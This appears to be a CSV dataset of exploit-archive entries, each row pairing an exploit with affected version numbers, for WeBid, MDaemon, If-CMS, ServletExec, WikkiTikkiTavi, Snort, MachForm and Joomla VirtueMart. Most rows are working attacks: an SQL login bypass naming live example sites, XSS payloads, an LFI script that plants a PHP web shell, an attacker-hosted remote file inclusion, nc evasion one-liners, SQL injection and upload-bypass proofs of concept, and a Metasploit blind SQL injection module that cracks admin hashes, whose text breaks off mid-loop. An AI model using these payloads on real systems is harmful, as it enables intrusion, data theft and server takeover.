6339,"webid 0.5.4 - Multiple Vulnerabilities                          ||          ||   | ||                          o_,_7 _||  . _o_7 _|| 4_|_||  o_w_,                  ( :   /    (_)    /           (   .                    ================================                       ==========================                          ==================== |-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=| |     _                   __           __       __          ______     | |   /' \            __  /'__`\        /\ \__  /'__`\       /\  ___\    | |  /\_, \    ___   /\_\/\_\L\ \    ___\ \ ,_\/\ \/\ \  _ __\ \ \__/    | |  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\ \___``\  | |     \ \ \/\ \/\ \ \ \ \/\ \L\ \/\ \__/\ \ \_\ \ \_\ \ \ \/ \/\ \L\ \ | |      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\  \ \____/ | |       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/   \/___/  | |                  \ \____/ >> Kings of injection                      | |                   \/___/                                             | |                                                                      | |-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|    Application :: WeBid v0.5.4  Multi Exploit  Found By :: Fisher762 [ SQ7@w.cn ]   Groups   : InjEctOr5     Download :: http://www.sourceforge.net/projects/simpleauction   Dork 1 ::   :P   ###########################[[[[EXPL0!T]]]]]#################################   [Bybpass]     Go to admin pannel   http://[Targ3t]/[webid]/admin/     username=  ' or 1=1/*  password= ass u like :)   __________________________________________________________________________   [ edit index css ]    u can edit  style css file [style.css]   http://[Targ3t]/webid/eledicss.php?nid=0&cd=themes/default&file=style.css   eX: http://www.fondoempleados.com/eledicss.php?nid=0&cd=themes/default&file=style.css    __________________________________________________________________________   [ view all Site SQL quires]     u can see all SQL quires     http://[Targ3t]/webid/logs/cron.log   eX: http://www.hardlyeverwornit.com//logs/cron.log   ###########################[[[[Th3 End]]]]]#################################  # milw0rm.com [2008-08-31]",['0.5.4'],1
20357,"Alt-N MDaemon free 12.5.4 - Persistent Cross-Site Scripting #!/usr/bin/python  '''  Author: loneferret of Offensive Security Product: Alt-N MDaemon Free Version: 12.5.4 Vendor Site: http://www.altn.com/ Software Download: http://www.altn.com/Downloads/  Timeline: 29 May 2012: Vulnerability reported to CERT 30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012 18 Jul 2012: Vendor requests additional information from CERT. CERT advises vendor to contact the researcher. 08 Aug 2012: Public Disclosure  Installed On: Windows Server 2003 SP2 Client Test OS: Window XP Pro SP3 (x86) Browser Used: Internet Explorer 8  Injection Point: Body Injection Payload(s): 1: exp/*<XSS STYLE='no\xss:noxss(""*//*""); xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'> 2: <IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))""> 3: <HTML><BODY> <?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""> <?import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>""> </BODY></HTML>  '''  import smtplib, urllib2  payload = """"""<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">""""""  def sendMail(dstemail, frmemail, smtpsrv, username, password):         msg  = ""From: hacker@offsec.local\n""         msg += ""To: victim@victim.local\n""         msg += 'Date: Today\r\n'         msg += ""Subject: XSS\n""         msg += ""Content-type: text/html\n\n""         msg += ""XSS"" + payload + ""\r\n\r\n""         server = smtplib.SMTP(smtpsrv)         server.login(username,password)         try:                 server.sendmail(frmemail, dstemail, msg)         except Exception, e:                 print ""[-] Failed to send email:""                 print ""[*] "" + str(e)         server.quit()  username = ""hacker@offsec.local"" password = ""123456"" dstemail = ""victim@victim.local"" frmemail = ""hacker@offsec.local"" smtpsrv  = ""172.16.84.171""  print ""[*] Sending Email"" sendMail(dstemail, frmemail, smtpsrv, username, password)",['12.5.4'],1
16980,"IF-CMS 2.07 - Local File Inclusion (1) #!/usr/bin/python # ~INFORMATION # Exploit Title:	If-CMS 2.07 Pre-Auth Local File Inclusion 0day Exploit # Author:		TecR0c # Date:			13/3/2011 # Software link:	http://bit.ly/hh9ZB4 # Tested on:		Linux bt # Version:		2.07 # PHP.ini Settings:	gpc_magic_quotes = Off  import random,time,sys,urllib,urllib2,re,httplib,socket,base64,os,getpass from optparse import OptionParser from urlparse import urlparse,urljoin from urllib import urlopen from cookielib import CookieJar  __CONTACT__ =""TecR0c(tecr0c@tecninja.net)"" __DATE__ =""13.3.2011""   usage = 'Example : %s http://localhost/ncms/ -p 127.0.0.1:8080' % __file__ parser = OptionParser(usage=usage) parser.add_option(""-p"",""--proxy"", type=""string"",action=""store"", dest=""proxy"",         help=""HTTP Proxy <server>:<port>"")  (options, args) = parser.parse_args()  if options.proxy:         print '[+] Using Proxy'+options.proxy  # User Agents agents = [""Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)"",         ""Internet Explorer 7 (Windows Vista); Mozilla/4.0 "",         ""Google Chrome 0.2.149.29 (Windows XP)"",         ""Opera 9.25 (Windows Vista)"",         ""Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)"",         ""Opera/8.00 (Windows NT 5.1; U; en)""] agent = random.choice(agents)  traversal = '../../../../../../../../../../../..' sessionLocation = '/var/lib/php5/'  def banner():     if os.name == ""posix"":         os.system(""clear"")     else:         os.system(""cls"")     header = ''' |----------------------------------------| |Exploit: If-CMS 2.07 LFI RCE |Author: %s |Date: %s |----------------------------------------|\n '''%(__CONTACT__,__DATE__)     for i in header:         print ""\b%s""%i,         sys.stdout.flush()         time.sleep(0.005)  def injectPayload(): 	webSiteUrl = url.geturl()+'index.php?newlang=<?php;system(base64_decode($_REQUEST[cmd]));?>'         try:                 opener.open(webSiteUrl)         except:                 print '[-] Failed'  def proxyCheck():         if options.proxy:                 try:                         h2 = httplib.HTTPConnection(options.proxy)                         h2.connect()                         print ""[+] Using Proxy Server:"",options.proxy                 except(socket.timeout):                         print ""[-] Proxy Timed Out\n""                         pass                         sys.exit(1)                 except(NameError):                         print ""[-] Proxy Not Given\n""                         pass                         sys.exit(1)                 except:                         print ""[-] Proxy Failed\n""                         pass                         sys.exit(1)  def getProxy():         try:                 proxy_handler = urllib2.ProxyHandler({'http': options.proxy})         except(socket.timeout):                 print ""\n[-] Proxy Timed Out""                 sys.exit(1)         return proxy_handler  cj = CookieJar() if options.proxy:         opener = urllib2.build_opener(getProxy(), urllib2.HTTPCookieProcessor(cj)) else:         opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) opener.addheaders = [('User-agent', agent)]  def postRequestWebShell(encodedCommand):         webSiteUrl = url.geturl()+'.shell.php'         commandToExecute = [         ('cmd',encodedCommand)]         cmdData = urllib.urlencode(commandToExecute)         try:                 response = opener.open(webSiteUrl, cmdData).read()         except:                 print '[-] Failed'                 sys.exit()         return response  def writeOutShell(encodedCommand): 	cookieString = str(cj) 	cookieSearch = re.compile(r""PHPSESSID=(.*) f"") 	session_value = cookieSearch.search(cookieString) 	if session_value: 		session_value = session_value.group(1) 	cj.clear() 	webSiteUrl = url.geturl()+'index.php?cmd='+encodedCommand+'&newlang='+traversal+sessionLocation+'sess_'+session_value+'%00' 	try:                 opener.open(webSiteUrl)         except:                 print '[-] Failed'                 sys.exit()  def commandLine():         encodedCommand = ""echo '<?php system(base64_decode($_REQUEST[cmd]));?>' > .shell.php""         encodedCommand = base64.b64encode(encodedCommand)         writeOutShell(encodedCommand)         commandLine = ('[RSHELL] %s@%s# ') % (getpass.getuser(),url.netloc)         while True:                 try:                         command = raw_input(commandLine)                         encodedCommand = base64.b64encode(command)                         response = postRequestWebShell(encodedCommand)                         print response                 except KeyboardInterrupt:                         encodedCommand = base64.b64encode('rm .shell.php')                         postRequestWebShell(encodedCommand)                         print ""\n[!] Removed .shell.php\n""                         sys.exit()  if ""__main__"" == __name__:         banner()         try:                 url=urlparse(args[0])         except:                 parser.print_help()                 sys.exit()         getProxy()         proxyCheck() 	injectPayload() 	commandLine()",['2.07'],1
21469,NewAtlanta ServletExec/ISAPI 4.1 - Full Path Disclosure source: https://www.securityfocus.com/bid/4793/info  ServletExec/ISAPI is a plug-in Java Servlet/JSP engine for Microsoft IIS. It runs with IIS on Microsoft Windows NT/2000/XP systems.  ServletExec/ISAPI discloses the absolute path to the webroot directory when sent a specially formatted request without a trailing filename.  This type of sensitive information may aid in further attacks against the host running the vulnerable software.  http://target/servlet/com.newatlanta.servletexec.JSP10Servlet/,['4.1'],1
21241,"WikkiTikkiTavi 0.x - Remote File Inclusion source: https://www.securityfocus.com/bid/3946/info  WikkiTikkiTavi is a freely available engine for running a Wiki site. Wiki sites are web communities which are based on the idea that every webpage is editable by users of the website. WikkiTikkiTavi is back-ended by a MySQL database and runs on most Linux and Unix variants, as well as Microsoft Windows NT/2000 operating systems.  WikkiTikkiTavi permits remote file including. As a result, a remote attacker may include an arbitrary file located on a remote host. This may be exploited via a malicious web request. If this file is a PHP script, it will be executed on the host running the vulnerable software with the privileges of the webserver.  The attacker may use this as an opportunity to gain local access on the host running the vulnerable software.  The following URL is sufficient to exploit this issue:  http://some.host/wikihome/action/conflict.php?TemplateDir=http://my.host/  where conflict.php is the name of the malicious attacker-supplied script.",['0.x'],1
27931,"Snort 2.4.x - URIContent Rules Detection Evasion source: https://www.securityfocus.com/bid/18200/info  Snort is reportedly prone to a vulnerability that may allow malicious packets to bypass detection.   A successful attack can allow attackers to bypass intrusion detection and to carry out attacks against computers protected by Snort.  This vulnerability affects Snort 2.4.4. Other versions may be vulnerable as well.  perl -e'print ""GET /www.example.com?paramter=|backdoor\r http/1.0\r\n\r\n""'|nc vulnerable.server 80  perl -e 'print ""GET \x90\x90\x0d http/1.0\r\n\r\n""'|nc 192.168.1.3 80  perl -e 'print ""GET \x0d/index.php\x90\x90 HTTP/1.0\n\r\n""'|nc 192.168.1.3 80","['2.4.x', '2.4.4']",1
44804,"MachForm < 4.2.3 - SQL Injection / Path Traversal / Upload Bypass Vendor: Appnitro Product webpage: https://www.machform.com/ Full-Disclose: https://metalamin.github.io/MachForm-not-0-day-EN/ Fix: https://www.machform.com/blog-machform-423-security-release/  Author: Amine Taouirsa Twitter: @metalamin  Google dork examples: ---------------------- ""machform"" inurl:""view.php"" ""machform"" inurl:""embed.php""  Summary: --------- The form creation platform MachForm from Appnitro is subject to SQL injections that lead to path traversal and arbitrary file upload.  The application is widely deployed and with some google dorks it’s possible to find various webpages storing sensitive data as credit card numbers with corresponding security codes. Also, the arbitrary file upload can let an attacker get control of the server by uploading a WebShell.  [1] SQL injection (CVE-2018-6410): -------------------------  [1.1] Description: The software is subject to SQL injections in the ‘download.php’ file.  [1.2] Parameters and statement: This SQLi can be found on the parameter ‘q’ which a base64 encoded value for the following parameters:    $form_id = $params['form_id'];   $id      = $params['id'];   $field_name = $params['el'];   $file_hash  = $params['hash'];   So the injectable parameters are ‘el’ and ‘form_id’ obtaining error-based, stacked queries and time-based blind SQL injections. This is due to the following vulnerable statement:    $query = ""select {$field_name} from `"".MF_TABLE_PREFIX.""form_{$form_id}` where id=?"";   [1.3] POC Proof of concept to get the first user mail:   http:// [URL] / [Machform_folder] /download.php?q= ZWw9IChTRUxFQ1QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHgy MDIwLChTRUxFQ1QgTUlEKCh1c2VyX2VtYWlsKSwxLDUwKSBGUk9NIGFwX3Vz ZXJzIE9SREVSIEJZIHVzZXJfaWQgTElNSVQgMCwxKSwweDIwMjAsRkxPT1Io UkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLkNIQVJBQ1RF Ul9TRVRTIEdST1VQIEJZIHgpYSkgOyZpZD0xJmhhc2g9MSZmb3JtX2lkPTE=  Which is the base64 encoding for:   el= (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x2020,(SELECT MID((user_email),1,50) FROM ap_users ORDER BY user_id LIMIT 0,1),0x2020,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) ;&id=1&hash=1&form_id=1   [2] Path traversal (CVE-2018-6409): -----------------------------------  [2.1] Descrition download.php’ is used to serve stored files from the forms answers. Modifying the name of the file to serve on the corresponding ap_form table leads to a path traversal vulnerability.  [2.2] POC First we need to change the name for the element on the form: update ap_form_58009 set element_4=""../../../../../../. ./../../../../../../../../../etc/passwd"" where id=1;  Now in order to be able to download it, we need to access:   http:// [URL] / [Machform_folder] /download.php?q= ZWw9NCZpZD0xJmhhc2g9NDAyYmEwMjMwZDZmNDRhMmRlNTkwYWMxMTEwN2E0 NTgmZm9ybV9pZD01ODAwOQo=  Which is the base64 encoding for;   el=4&id=1&hash=402ba0230d6f44a2de590ac11107a458&form_id=58009  Note that hash is the MD5 of the corresponding filename:   md5(""../../../../../../../../../../../../../../../../etc/passwd"") = 402ba0230d6f44a2de590ac11107a458  [3] Bypass file upload filter (CVE-2018-6411): ----------------------------------------------  When the form is set to filter a blacklist, it automatically add dangerous extensions to the filters. If the filter is set to a whitelist, the dangerous extensions can be bypassed.  This can be done directly on the database via SQLi update ap_form_elements set element_file_type_list=""php"", element_file_block_or_allow=""a"" where form_id=58009 and element_id=4;  Once uploaded the file can be found and executed in the following URL: http:// [URL] / [Machform_folder] /data/form_58009/files/ [filename]  The filename can be found in the database SELECT element_4 FROM ap_form_58009 WHERE id=1;",['< 4.2.3'],1
17579,"Joomla! Component com_virtuemart 1.1.7/1.5 - Blind SQL Injection (Metasploit) # Exploit Title: Joomla 1.5 com_virtuemart <= 1.1.7 blind time-based sql injection MSF module # Date: Thu Jul 28, 2011 # Author: TecR0c - tecr0c.mythsec [@] gmail.com # Version: <= 1.1.7 # Download: http://dev.virtuemart.net/projects/virtuemart/files # Greetz: mythsec team, James Bercega for code base for sqli blind   require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking 	 	include Msf::Exploit::Remote::HttpClient 	 	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Joomla 1.5 VirtueMart Component <= 1.1.7 Blind SQL Injection', 			'Description'    => %q{ 			A vulnerability was discovered by Rocco Calvi and Steve Seeley which identifies 			unauthenticated time-based blind SQL injection in the ""page"" variable of the  			virtuemart component. This vulnerability allows an attacker to gain information 			from the database with specially crafted URLs taking advantage of the MySQL 			benchmark. This issue was patched in version 1.1.7a. 			}, 			'Author'         => 				[ 					'TecR0c',  #Initial discovery, msf module 					'mr_me',  #Initial discovery with TecR0c 				], 			'License'        =>  MSF_LICENSE, 			'References'     => 				[ 					[ 'URL', 'http://www.exploit-db.com/exploits/17132/' ], 					[ 'URL','http://www.stratsec.net/Research/Advisories/' ], 				], 			'Privileged'     =>  false, 			'Platform'       => 'php', 			'Arch'           =>  ARCH_PHP, 			'Targets'        => [[ 'Automatic', { }]], 			'DisclosureDate' => 'Feb 11 2011', 			'DefaultTarget'  => 0 )) 			 			register_options( 				[ 					OptString.new('JDIR', [true, 'Joomla directory', '/']), 					OptInt.new('BMCT', [true, 'Benchmark Counter', 50000000 ]), 					OptInt.new('BMDF', [true, 'Benchmark Difference', 3 ]), 					OptInt.new('BMRC', [true, 'Benchmark Request Count', 1 ]), 					OptString.new('WLIST', [true,  								'Wordlist location', 						 		'/home/foo/bar.txt'  								]), 					OptString.new('AGNT', [false, 'User Agent Info', 'Mozilla/5.0' ]), 					OptString.new('PREF', [false, 'Database prefixt', 'jos_' ]), 					OptString.new('JQRY', [false,  								'URI to trigger bug',  								'index.php?option=com_virtuemart&page=1'  								]) 				], self.class) 	end 	################################################# 	# Extract ""Set-Cookie"" 	def init_cookie(data, cstr = true) 	 		# Raw request? Or cookie data specifically? 		data = data.headers['Set-Cookie'] ? data.headers['Set-Cookie']: data 		 		# Beginning 		if ( data ) 			 			# Break them apart 			data = data.split(', ') 			 			# Initialize 			ctmp = '' 			tmps = {} 			 			# Parse cookies 			data.each do | x | 			 				# Remove extra data 				x = x.split(';')[0] 				 				# Seperate cookie pairs 				if ( x =~ /([^;\s]+)=([^;\s]+)/im ) 					 					# Key 					k = $1 					 					# Val 					v = $2 					 					# Valid cookie value? 					if ( v.length() > 0 ) 					 						# Build cookie hash 						tmps[k] = v 						 						# Report cookie status 						print_status(""Got Cookie: #{k} => #{v}""); 					end 				end 			end 			 			# Build string data 			if ( cstr == true ) 				 				# Loop 				tmps.each do |x,y| 					 					# Cookie key/value 					ctmp << ""#{x}=#{y};"" 				end 				 				# Assign 				tmps['cstr'] = ctmp 			end 			 			# Return 			return tmps 		else 			# Something may be wrong 			init_debug(""No cookies within the given response"") 		end 	end 	 	################################################# 	 	# Simple debugging output 	def init_debug(resp, exit = 0) 	 		# Continue execution 		if ( exit.to_i > 0 ) 		 			# Exit 			exit(0) 		end 		 	end 	 	################################################# 	 	# Generic post wrapper 	def http_post(url, data, headers = {}, timeout = 15) 	 		# Protocol 		proto = datastore['SSL'] ? 'https': 'http' 		 		# Determine request url 		url = url.length ? url: '' 		 		# Determine User-Agent 		headers['User-Agent'] = headers['User-Agent']  ? 		headers['User-Agent'] : datastore['AGNT'] 		 		# Determine Content-Type 		headers['Content-Type'] = headers['Content-Type'] ? 		headers['Content-Type'] : ""application/x-www-form-urlencoded"" 		 		# Determine Content-Length 		headers['Content-Length'] = data.length 		 		# Determine Referer 		headers['Referer'] = headers['Referer']        ? 		headers['Referer'] : ""#{proto}://#{datastore['RHOST']}#{datastore['JDIR']}"" 		 		# Delete all the null headers 		headers.each do | hkey, hval | 			 			# Null value 			if ( !hval ) 			 				# Delete header key 				headers.delete(hkey) 			end 		end 		 		# Send request 		resp = send_request_raw( 		{ 			'uri'     => datastore['JDIR'] + url, 			'method'  => 'POST', 			'data'    => data, 			'headers' => headers 		}, 		timeout	) 			 			 		# Returned 		return resp 	 	end 	 	################################################# 	 	# Generic post multipart wrapper 	def http_post_multipart(url, data, headers = {}, timeout = 15) 		 		# Boundary string 		bndr =  Rex::Text.rand_text_alphanumeric(8) 		 		# Protocol 		proto = datastore['SSL'] ? 'https': 'http' 	 		# Determine request url 		url = url.length ? url: '' 		 		# Determine User-Agent 		headers['User-Agent'] = headers['User-Agent']  ? 		headers['User-Agent'] : datastore['AGNT'] 		 		# Determine Content-Type 		headers['Content-Type'] = headers['Content-Type'] ? 		headers['Content-Type'] : ""multipart/form-data; boundary=#{bndr}"" 		 		# Determine Referer 		headers['Referer'] = headers['Referer']        ? 		headers['Referer'] : ""#{proto}://#{datastore['RHOST']}#{datastore['JDIR']}"" 		 		# Delete all the null headers 		headers.each do | hkey, hval | 		 			# Null value 			if ( !hval ) 			 				# Delete header key 				headers.delete(hkey) 			end 		end 		 		# Init 		temp = '' 		 		# Parse form values 		data.each do |name, value| 		 			# Hash means file data 			if ( value.is_a?(Hash) ) 				 				# Validate form fields 				filename = value['filename'] ? value['filename']: 						 init_debug(""Filename value missing from #{name}"", 1) 				contents = value['contents'] ? value['contents']: 						 init_debug(""Contents value missing from #{name}"", 1) 				mimetype = value['mimetype'] ? value['mimetype']: 						 init_debug(""Mimetype value missing from #{name}"", 1) 				encoding = value['encoding'] ? value['encoding']: ""Binary"" 				 				# Build multipart data 				temp << ""--#{bndr}\r\n"" 				temp << ""Content-Disposition: form-data; name=\""#{name}\"" 					; filename=\""#{filename}\""\r\n"" 				temp << ""Content-Type: #{mimetype}\r\n"" 				temp << ""Content-Transfer-Encoding: #{encoding}\r\n"" 				temp << ""\r\n"" 				temp << ""#{contents}\r\n"" 				 			else 				# Build multipart data 				temp << ""--#{bndr}\r\n"" 				temp << ""Content-Disposition: form-data; name=\""#{name}\"";\r\n"" 				temp << ""\r\n"" 				temp << ""#{value}\r\n"" 			end 		end 		 		# Complete the form data 		temp << ""--#{bndr}--\r\n"" 		 		# Assigned 		data = temp 		 		# Determine Content-Length 		headers['Content-Length'] = data.length 		 		# Send request 		resp = send_request_raw( 		{ 			'uri'     => datastore['JDIR'] + url, 			'method'  => 'POST', 			'data'    => data, 			'headers' => headers 		},  		timeout) 		 		# Returned 		return resp 		 	end 	 	################################################# 	 	# Generic get wrapper 	def http_get(url, headers = {}, timeout = 15) 		 		# Protocol 		proto = datastore['SSL'] ? 'https': 'http' 		 		# Determine request url 		url = url.length ? url: '' 		 		# Determine User-Agent 		headers['User-Agent'] = headers['User-Agent']  ? 		headers['User-Agent'] : datastore['AGNT'] 		 		# Determine Referer 		headers['Referer'] = headers['Referer']        ?  		headers['Referer'] : ""#{proto}://#{datastore['RHOST']}#{datastore['JDIR']}"" 		 		# Delete all the null headers 		headers.each do | hkey, hval | 		 			# Null value // Also, remove post specific data, due to a bug ... 			if ( !hval || hkey == ""Content-Type"" || hkey == ""Content-Length"" ) 			 				# Delete header key 				headers.delete(hkey) 			end 		end 		 		 		# Send request 		resp = send_request_raw({ 			'uri'     => datastore['JDIR'] + url, 			'headers' => headers, 			'method'  => 'GET', 		}, timeout) 		 		# Returned 		return resp 		 	end 	 	################################################# 	 	 	# Used to perform benchmark querys 	def sql_benchmark(test, hdrs, table = nil, where = '1+LIMIT+1', tnum = nil )  	 		# Init 		wait = 0 		 		# Defaults 		table = table ? table: 'users' 		 		# SQL Injection string used to trigger the MySQL BECNHMARK() function 		sqli = (""'+UNION+SELECT+IF(#{test},+BENCHMARK(#{datastore['BMCT']},\ +MD5(1)),+0)+FROM+#{datastore['PREF']}#{table}+WHERE+#{where}--+sqli.page"") 		 		# Number of tests to run. We run this 		# amount of tests and then look for a 		# median value that is greater than 		# the benchmark difference. 		tnum = tnum ? tnum: datastore['BMRC'] 		 		# Run the tests 		tnum.to_i.times do | i | 		 			# Start time 			bmc1 = Time.now.to_i 			 			# Make the request 			 			 			init_debug(http_get(""#{datastore['JQRY']}#{sqli}"", hdrs)) 			# End time 			bmc2 = Time.now.to_i 			 			 			# Total time 			wait += bmc2 - bmc1 		end 		 		# Return the results 		return ( wait.to_i / tnum.to_i ) 		 	end 	 	 	################################################# 	 	 	# Used to perform benchmark querys 	def sql_benchmark_2(hdrs, columns = nil, table = nil, where = '1+LIMIT+1', tnum = nil ) 	 		# Init 		wait = 0 		 		# Defaults 		table = table ? table: 'users' 		 		# SQL Injection string used to trigger the MySQL BECNHMARK() function 		sqli = ( ""'+UNION+SELECT+IF(substring((select+#{columns}+FROM+#{datastore['PREF']}#{table}+WHERE+#{where}),1,1),BENCHMARK(#{datastore['BMCT']},+MD5(1)),+0)--+sqli.page"") 		 		# Number of tests to run. We run this 		# amount of tests and then look for a 		# median value that is greater than 		# the benchmark difference. 		tnum = tnum ? tnum: datastore['BMRC'] 		 		# Run the tests 		tnum.to_i.times do | i | 		 			# Start time 			bmc1 = Time.now.to_i 			 			# Make the request 			 			 			init_debug(http_get(""#{datastore['JQRY']}#{sqli}"", hdrs)) 			# End time 			bmc2 = Time.now.to_i 			 			 			# Total time 			wait += bmc2 - bmc1 		end 		 		# Return the results 		return ( wait.to_i / tnum.to_i ) 		 	end 	 	 	################################################# 	 	 	def get_password(hash, salt, opts = nil) 	 		# Wordlist 		wlst = datastore['WLIST'] 		 		# Init 		cntr = 0 			 		# Verbose 		print_status(""Attempting to crack admin password hash"") 		 		# Valid hash length only 		if ( hash.length != 32 ) 		 			# Failure 			print_error(""Invalid Joomla MD5 hash: #{hash.to_s}"") 			return nil 		end 		 		# Does the wordlist exist? 		if ( !File.exist?(wlst) ) 		 			# Failure 			print_error(""Unable to load wordlist: #{wlst}"") 			return nil 		else 			 			# Load the wordlist file 			list = File.readlines(wlst) 		end 		 		# Verbose 		print_status(""Loaded #{list.count.to_s} words from the specified list"") 		print_status(""This may take quite some time ..."") 		 		# Start time 		bmc1 = Time.now.to_i 		 		# Loop through list 		list.each do | word | 		 			# Cleanup 			word = word.strip 			 			# Counter 			cntr = cntr + 1 			 			# Attempt to find the plaintext password 			if ( hash == Rex::Text.md5(word + salt) ) 			 				# Success! 				print_status(""Successfully cracked the following hash"") 				print_status(""#{hash} => #{salt} == #{word}"") 				 				# Ended time 				bmc2 = Time.now.to_i 				 				# Duration 				bmc3 = bmc2 - bmc1 				bmc3 = ( bmc3 < 60 ) ? ""#{bmc3} seconds"": ""#{(bmc3/60)} minutes"" 				 				# Verbose 				print_status(""Operation completed in #{bmc3}"") 				 				# Return 				return word 			end # if 		end # each 		 		# Failure 		print_error(""Unable to crack the following hash"") 		print_error(""#{hash} => #{salt} == ???"") 		 		# Ended time 		bmc2 = Time.now.to_i 		 		# Duration 		bmc3 = bmc2 - bmc1 		bmc3 = ( bmc3 < 60 ) ? ""#{bmc3} seconds"": ""#{(bmc3/60)} minutes"" 		 		# Verbose 		print_status(""Operation completed in #{bmc3}"") 		 		# Return 		return nil 	end 	 	################################################# 	 	def get_users_data(hdrs, snum, slim, cset, sqlf, sqlw)  			# Start time 			tot1 = Time.now.to_i 			 			# Initialize 			reqc = 0 			retn = String.new 				 			# Extract salt 			for i in snum..slim 			 				# Offset position 				oset = ( i - snum ) + 1 	 				# Loop charset 				for cbit in cset 	 					# Test character 					cbit.each do | cchr | 	 						# Start time (overall) 						bmc1 = Time.now.to_i 	 						# Benchmark query 						bmcv = sql_benchmark(""SUBSTRING(#{sqlf},#{i},1)+LIKE+BINARY+CHAR(#{cchr.ord})"", 						hdrs,""users"", sqlw, datastore['BMRC']) 	 						# Noticable delay? We must have a match! ;) 						if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) ) 	 							# Verbose 							print_status(sprintf(""Character %02s is %s"", oset.to_s, cchr )) 	 							# Append chr 							retn << cchr 	 							# Exit loop 							break 						end  	 						# Counter 						reqc += 1 	 					end # each 				end # for 	 				# Host not vulnerable? 				if ( oset != retn.length ) 					 					# Failure 					print_error(""Unable to extract character ##{oset.to_s}\ 					. Extraction failed!"") 					return nil 				end 			end # for 	 			# End time (total) 			tot2 = Time.now.to_i 	 			# Benchmark totals 			tot3 = tot2 - tot1 	 			# Verbose 			print_status(""Found data: #{retn}"") 			print_status(""Operation required #{reqc.to_s} requests (#{( tot3 / 60).to_s} minutes)"") 			 			# Return 			return retn 	end 	 	################################################# 	 	def check                  print_status(""Attempting to determine virtuemart version"")                  resp = http_get(""modules/mod_virtuemart_currencies/mod_virtuemart_currencies.xml"")                  # Extract Joomla version information                 if ( resp.body =~ /<version>([^\s]+)<\/version>/ )                          # Version                         vers = $1.strip                          # Version ""parts""                         ver1, ver2, ver3 = vers.split(/\./)                          # Only if version 1.1.7                         if ( ver3.to_i >= 7)                                  # Exploit failed                                 init_debug(resp) 				print_status(""Please confirm manually"") 				return Exploit::CheckCode::Safe                         else                                  print_status(""The target is running VirtueMart : #{vers}"") 				return Exploit::CheckCode::Vulnerable                         end                 else                          # Verbose                         print_error(""Unable to determine Joomla version ..."")                 end  	end 	 	################################################# 	def exploit 	 		# Numeric test string 		tstr = Time.now.to_i.to_s  		# MD5 test string 		tmd5 = Rex::Text.md5(tstr) 	 		# Encoded payload 		load = payload.encoded 		 		################################################# 		# STEP 02 // Get the cookie for virtuemart :)  		#################################################  		# request to get virtuemart cookie  		resp = http_get(""index.php?option=com_virtuemart&page=1"")  		# Init cookie 		cook = init_cookie(resp)  		# Build headers for authenticated session 		hdrs = { ""Cookie"" => cook['cstr'] }  		################################################# 		# STEP 03 // Calculate BENCHMARK() response times 		#################################################  		# Verbose 		print_status(""Calculating target response times"") 		print_status(""Benchmarking #{datastore['BMRC']} normal requests"") 		  		# Normal request median (globally accessible) 		datastore['BMC0'] = sql_benchmark(""1=2"", hdrs) 		 		# Verbose 		print_status(""Normal request avg: #{datastore['BMC0'].to_s} seconds"") 		print_status(""Benchmarking #{datastore['BMRC']} delayed requests"")  		# Delayed request median 		bmc1 = sql_benchmark(""1=1"", hdrs)  		# Verbose 		print_status(""Delayed request avg: #{bmc1.to_s} seconds"")  		# Benchmark totals 		bmct = bmc1 - datastore['BMC0']  		# Delay too small. The host may not be 		# vulnerable. Try increasing the BMCT. 		if ( bmct.to_i < datastore['BMDF'].to_i )  			# Verbose 			print_error(""your benchmark threshold is small, or host is not vulnerable"") 			print_error(""increase the benchmark threshold adjust the value of the BMDF"") 			print_error(""increase the expression iterator adjust the value of the BMCT"") 			return 		else 			# Host appears exploitable 			print_status(""Request Difference: #{bmct.to_s} seconds"") 		end  		################################################# 		# STEP 04 // Attempting to find a valid admin id 		################################################# 		 		atot = 0     # Total admins 		scnt = 0     # Step counter 		step = 10    # Step increment 		slim = 10000 # Step limit 		 		# 42 is the hard coded base uid within Joomla ... 		# ... and the answer to the ultimate question! ;] 		snum = ( !defined?(auid) ) ? 62: auid # changed from 42 to 62 		 		# Verbose 		print_status(""Calculating total number of administrators"") 		 		# Check how many admin accounts are in the database 		for i in 0..slim do  			# Benchmark  			bmcv = sql_benchmark_2(hdrs, ""gid"", ""users"", ""gid=25+LIMIT+#{i.to_s},1"",datastore['BMRC']) 			 			# If we do not have a delay, then we have reached the end ... 			if ( !( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) ) )  				# Range 				atot = i 				 				# Verbose 				print_status(""Successfully confirmed #{atot.to_s} admin accounts"")  				# Exit loop 				break 			end  		end 			 		# Loops until limit 		while ( snum < slim && scnt < atot ) 	 			# Verbose 			print_status(""Attempting to find a valid admin ID"") 			 			# Verbose 			print_status(""Stepping from #{snum.to_s} to #{slim.to_s} by #{step.to_s}"") 	 			for i in snum.step(slim, step) 				bmcv = 0 				 	 				# Benchmark 				bmcv = sql_benchmark(""#{i}+>+id"", hdrs, ""users"",""gid=25+LIMIT+#{scnt.to_s},1"", datastore['BMRC'])  				# Noticable delay? We must have a match! ;) 